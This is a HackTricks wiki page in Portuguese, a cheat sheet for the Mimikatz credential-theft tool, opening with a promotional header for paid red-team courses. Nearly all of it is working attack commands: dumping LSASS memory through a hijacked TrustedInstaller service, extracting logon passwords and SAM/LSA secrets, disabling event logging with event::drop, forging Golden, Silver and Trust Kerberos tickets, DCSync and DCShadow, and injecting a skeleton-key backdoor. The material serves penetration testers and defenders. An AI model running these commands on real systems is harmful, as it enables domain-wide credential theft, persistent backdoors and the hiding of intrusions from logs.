# Mimikatz

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Você trabalha em uma **empresa de cibersegurança**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Esta página é baseada em uma do [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Confira o original para mais informações!

## LM e texto claro na memória

A partir do Windows 8.1 e Windows Server 2012 R2, medidas significativas foram implementadas para proteger contra roubo de credenciais:

- **Hashes LM e senhas em texto claro** não são mais armazenados na memória para aumentar a segurança. Uma configuração específica do registro, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, deve ser configurada com um valor DWORD de `0` para desativar a Autenticação Digest, garantindo que senhas "em texto claro" não sejam armazenadas em cache no LSASS.

- **Proteção LSA** é introduzida para proteger o processo da Autoridade de Segurança Local (LSA) contra leitura não autorizada de memória e injeção de código. Isso é alcançado marcando o LSASS como um processo protegido. A ativação da Proteção LSA envolve:
1. Modificar o registro em _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ definindo `RunAsPPL` como `dword:00000001`.
2. Implementar um Objeto de Diretiva de Grupo (GPO) que aplique essa alteração de registro em dispositivos gerenciados.

Apesar dessas proteções, ferramentas como o Mimikatz podem contornar a Proteção LSA usando drivers específicos, embora tais ações provavelmente sejam registradas nos logs de eventos.

### Contrariando a Remoção do Privilégio SeDebugPrivilege

Administradores geralmente têm o SeDebugPrivilege, permitindo que depurem programas. Esse privilégio pode ser restringido para evitar despejos de memória não autorizados, uma técnica comum usada por atacantes para extrair credenciais da memória. No entanto, mesmo com esse privilégio removido, a conta TrustedInstaller ainda pode realizar despejos de memória usando uma configuração de serviço personalizada:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Isso permite o despejo da memória do `lsass.exe` em um arquivo, que pode então ser analisado em outro sistema para extrair credenciais:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Opções do Mimikatz

A manipulação de logs de eventos no Mimikatz envolve duas ações principais: limpar logs de eventos e modificar o serviço de Eventos para evitar o registro de novos eventos. Abaixo estão os comandos para realizar essas ações:

#### Limpando Logs de Eventos

- **Comando**: Esta ação visa deletar os logs de eventos, dificultando o rastreamento de atividades maliciosas.
- O Mimikatz não fornece um comando direto em sua documentação padrão para limpar logs de eventos diretamente via linha de comando. No entanto, a manipulação de logs de eventos geralmente envolve o uso de ferramentas do sistema ou scripts fora do Mimikatz para limpar logs específicos (por exemplo, usando PowerShell ou Visualizador de Eventos do Windows).

#### Recurso Experimental: Modificando o Serviço de Eventos

- **Comando**: `event::drop`
- Este comando experimental é projetado para modificar o comportamento do Serviço de Registro de Eventos, impedindo efetivamente o registro de novos eventos.
- Exemplo: `mimikatz "privilege::debug" "event::drop" exit`

- O comando `privilege::debug` garante que o Mimikatz opere com os privilégios necessários para modificar os serviços do sistema.
- O comando `event::drop` então modifica o serviço de Registro de Eventos.


### Ataques de Ticket Kerberos

### Criação de Golden Ticket

Um Golden Ticket permite a impersonação de acesso em toda a rede de domínio. Comando chave e parâmetros:

- Comando: `kerberos::golden`
- Parâmetros:
- `/domain`: O nome do domínio.
- `/sid`: O Identificador de Segurança (SID) do domínio.
- `/user`: O nome de usuário a ser impersonificado.
- `/krbtgt`: O hash NTLM da conta de serviço KDC do domínio.
- `/ptt`: Injeta diretamente o ticket na memória.
- `/ticket`: Salva o ticket para uso posterior.

Exemplo:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Criação de Silver Ticket

Silver Tickets concedem acesso a serviços específicos. Comando chave e parâmetros:

- Comando: Semelhante ao Golden Ticket, mas direcionado a serviços específicos.
- Parâmetros:
- `/service`: O serviço a ser direcionado (por exemplo, cifs, http).
- Outros parâmetros semelhantes ao Golden Ticket.

Exemplo:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Criação de Trust Ticket

Trust Tickets são usados para acessar recursos em diferentes domínios, aproveitando os relacionamentos de confiança. Comando chave e parâmetros:

- Comando: Semelhante ao Golden Ticket, mas para relacionamentos de confiança.
- Parâmetros:
  - `/target`: O FQDN do domínio alvo.
  - `/rc4`: O hash NTLM para a conta de confiança.

Exemplo:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Comandos Kerberos Adicionais

- **Listar Tickets**:
- Comando: `kerberos::list`
- Lista todos os tickets Kerberos para a sessão do usuário atual.

- **Passar o Cache**:
- Comando: `kerberos::ptc`
- Injeta tickets Kerberos a partir de arquivos de cache.
- Exemplo: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Passar o Ticket**:
- Comando: `kerberos::ptt`
- Permite usar um ticket Kerberos em outra sessão.
- Exemplo: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Limpar Tickets**:
- Comando: `kerberos::purge`
- Limpa todos os tickets Kerberos da sessão.
- Útil antes de usar comandos de manipulação de tickets para evitar conflitos.


### Manipulação do Active Directory

- **DCShadow**: Temporariamente faz uma máquina agir como um DC para manipulação de objetos AD.
- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Imita um DC para solicitar dados de senha.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Acesso a Credenciais

- **LSADUMP::LSA**: Extrai credenciais do LSA.
- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Imita um DC usando dados de senha de uma conta de computador.
- *Nenhum comando específico fornecido para NetSync no contexto original.*

- **LSADUMP::SAM**: Acessa o banco de dados SAM local.
- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Decifra segredos armazenados no registro.
- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Define um novo hash NTLM para um usuário.
- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Recupera informações de autenticação de confiança.
- `mimikatz "lsadump::trust" exit`

### Diversos

- **MISC::Skeleton**: Injeta uma backdoor no LSASS em um DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Escalação de Privilégios

- **PRIVILEGE::Backup**: Adquire direitos de backup.
- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Obtém privilégios de debug.
- `mimikatz "privilege::debug" exit`

### Despejo de Credenciais

- **SEKURLSA::LogonPasswords**: Mostra credenciais para usuários logados.
- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Extrai tickets Kerberos da memória.
- `mimikatz "sekurlsa::tickets /export" exit`

### Manipulação de Sid e Token

- **SID::add/modify**: Altera SID e SIDHistory.
- Adicionar: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modificar: *Nenhum comando específico para modificar no contexto original.*

- **TOKEN::Elevate**: Imita tokens.
- `mimikatz "token::elevate /domainadmin" exit`

### Serviços de Terminal

- **TS::MultiRDP**: Permite múltiplas sessões RDP.
- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Lista sessões TS/RDP.
- *Nenhum comando específico fornecido para TS::Sessions no contexto original.*

### Vault

- Extrai senhas do Windows Vault.
- `mimikatz "vault::cred /patch" exit`
